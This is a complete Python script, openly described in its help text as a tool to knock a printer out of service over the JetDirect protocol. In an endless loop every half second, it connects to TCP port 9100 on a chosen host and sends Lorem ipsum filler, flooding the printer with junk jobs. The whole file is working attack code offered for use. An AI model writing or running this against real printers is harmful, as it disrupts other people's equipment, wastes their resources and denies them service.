import socket
import argparse
import time

DEFAULT_PORT = 9100
DEFAULT_MESSAGE = b"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus arcu erat, pretium a rhoncus non, condimentum eu metus. Duis ac felis quis mauris laoreet congue feugiat ac felis. In feugiat risus commodo urna malesuada maximus. Fusce vitae ipsum aliquam ipsum ullamcorper accumsan vitae sit amet libero. Etiam venenatis sit amet lorem nec auctor. Vivamus ultrices auctor nibh ac ullamcorper. Quisque eget mauris sit amet urna tempus congue eu eget risus. Ut eget nulla quis arcu varius mattis. Suspendisse lobortis risus ac ex efficitur, non rutrum mauris semper. Donec pharetra magna eu facilisis imperdiet. Aenean gravida nec metus vitae dictum. Etiam lectus leo, egestas vitae congue quis, faucibus sed felis."
DEFAULT_SLEEP_TIME = 0.5

def send_data(host):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, DEFAULT_PORT))
            s.sendall(DEFAULT_MESSAGE)
    except Exception as e:
        print(f"Error in sending data: {e}")

def main():
    parser = argparse.ArgumentParser(description="A simple tool to DoS a printer by sending junk data over jetdirect protocol.")
    parser.add_argument("-H", "--host", type=str, help="Printer host")
    args = parser.parse_args()

    print("Script is running!")
    while True:
        send_data(args.host)
        time.sleep(DEFAULT_SLEEP_TIME)

if __name__ == "__main__":
    main()